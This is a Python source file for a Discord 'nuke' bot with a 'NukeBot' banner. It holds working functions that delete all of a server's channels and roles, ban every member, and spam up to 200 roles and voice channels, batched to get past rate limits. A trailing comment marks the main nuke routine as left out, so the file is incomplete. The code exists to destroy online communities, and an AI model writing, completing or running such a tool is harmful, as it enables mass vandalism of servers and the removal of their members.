import discord
from discord.ext import commands
from colorama import init, Fore as cc
from os import name as os_name, system
from sys import exit
import asyncio
import logging

# Initialize colorama and logging
init()
logging.basicConfig(level=logging.INFO)

# Color shortcuts
dr = r = cc.LIGHTRED_EX
g = cc.LIGHTGREEN_EX
b = cc.LIGHTBLUE_EX
m = cc.LIGHTMAGENTA_EX
c = cc.LIGHTCYAN_EX
y = cc.LIGHTYELLOW_EX
w = cc.RESET

# Clear screen function
clear = lambda: system('cls') if os_name == 'nt' else system('clear')

# Input function with color
def _input(text):
    print(text, end='')
    return input()

# Banner
baner = f'''
{r} _   _       _       {m} ____        _   
{r}| \ | |_   _| | _____{m}| __ )  ___ | |_ 
{r}|  \| | | | | |/ / _ {m}\  _ \ / _ \| __|
{r}| |\  | |_| |   <  __{m}/ |_) | (_) | |_ 
{r}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
{y}Made by: {g}FASIL_503'''

# Batch processing with strict rate limiting
async def bulk_operation(tasks, delay=5):
    results = await asyncio.gather(*tasks, return_exceptions=True)
    success = 0
    for result in results:
        if isinstance(result, Exception):
            logging.error(f'Operation failed: {result}')
        else:
            success += 1
    await asyncio.sleep(delay)
    return success

# Modified operations with 30 per 5 seconds rate limit
async def delete_all_channel(guild):
    channels = list(guild.channels)
    deleted = 0
    for i in range(0, len(channels), 30):  # Changed to 30
        batch = channels[i:i+30]
        deleted += await bulk_operation([c.delete() for c in batch], 5)
    return deleted

async def delete_all_roles(guild):
    roles = [r for r in guild.roles if r.name != "@everyone"]
    deleted = 0
    for i in range(0, len(roles), 30):  # Changed to 30
        batch = roles[i:i+30]
        deleted += await bulk_operation([r.delete() for r in batch], 5)
    return deleted

async def ban_all_members(guild):
    if not guild.me.guild_permissions.ban_members:
        logging.warning("Missing ban permissions")
        return 0
    
    members = [m for m in guild.members if m != guild.me]
    banned = 0
    for i in range(0, len(members), 30):  # Changed to 30
        batch = members[i:i+30]
        banned += await bulk_operation([m.ban() for m in batch], 5)
    return banned

async def create_roles(guild, name):
    existing = len(guild.roles)
    to_create = 200 - existing
    created = 0
    while created < to_create:
        batch = min(30, to_create - created)  # Changed to 30
        created += await bulk_operation([guild.create_role(name=name) for _ in range(batch)], 5)
    return created

async def create_voice_channels(guild, name):
    existing = len(guild.channels)
    to_create = 200 - existing
    created = 0
    while created < to_create:
        batch = min(30, to_create - created)  # Changed to 30
        created += await bulk_operation([guild.create_voice_channel(name=name) for _ in range(batch)], 5)
    return created

# Rest of the code remains the same (nuke_guild function and main loop)
# ... [Keep the rest of the code identical from previous version] ...
